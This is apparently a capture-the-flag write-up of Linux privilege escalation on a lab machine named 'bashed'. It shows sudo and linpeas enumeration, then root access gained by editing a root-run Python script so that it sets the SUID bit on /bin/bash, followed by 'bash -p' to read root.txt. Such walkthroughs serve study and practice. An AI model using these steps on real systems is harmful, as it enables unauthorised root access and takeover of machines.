```bash
www-data@bashed

:/home/arrexel# sudo -l

  
Matching Defaults entries for www-data on bashed:  
env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  
  
User www-data may run the following commands on bashed:  
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

users owned:
* www-data
* scriptmanager

## linpeas
```bash
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                            

[+] Users with console
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash                                                                                                                                                                                     
root:x:0:0:root:/root:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash


[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                                                                                                    
/usr/bin/gettext.sh                                                                                                                                                                                                                        

[+] Unexpected in root
/scripts                                                                                                                                                                                                                                   
/lost+found
/initrd.img
/vmlinuz

```

## writable script

```bash
scriptmanager@bashed:/home/arrexel$ cd /scripts
scriptmanager@bashed:/scripts$ cat *
f = open("test.txt", "w")
f.write("testing 123!")
f.close
testing 123!scriptmanager@bashed:/scripts$ ls -al
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jun  9 22:33 test.txt
scriptmanager@bashed:/scripts$ nano test.py
scriptmanager@bashed:/scripts$ cat test.py
import os

os.system('chmod +s /bin/bash')

f = open("test.txt", "w")
f.write("testing 123!")
f.close

scriptmanager@bashed:/scripts$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ bash -p
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt 

```